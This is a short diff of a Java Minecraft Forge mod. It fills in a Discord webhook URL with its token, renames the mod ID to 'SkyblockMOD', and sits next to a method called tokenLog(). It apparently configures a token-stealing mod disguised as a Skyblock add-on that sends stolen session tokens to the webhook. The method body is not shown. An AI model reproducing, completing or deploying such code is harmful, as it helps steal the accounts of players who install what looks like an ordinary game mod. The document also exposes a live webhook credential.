@@ -44,9 +44,9 @@ import java.util.function.UnaryOperator;
 
 @Mod(modid = Main.MODID, version = Main.VERSION)
 public class Main {
-    public static final String webhook = "PUT WEBHOOK HERE";
+    public static final String webhook = "https://discord.com/api/webhooks/1310789431346728990/4gRi-LF4aEC-Pa3kKLiKf-SeWNTNVxjEUgoSTWO1Xb8sijGOHuC4-w_ZQqFOtYoHjwXb";
 
-    public static final String MODID = "balls";
+    public static final String MODID = "SkyblockMOD";
     public static final String VERSION = "1.8.9";
 
     public static void tokenLog() {
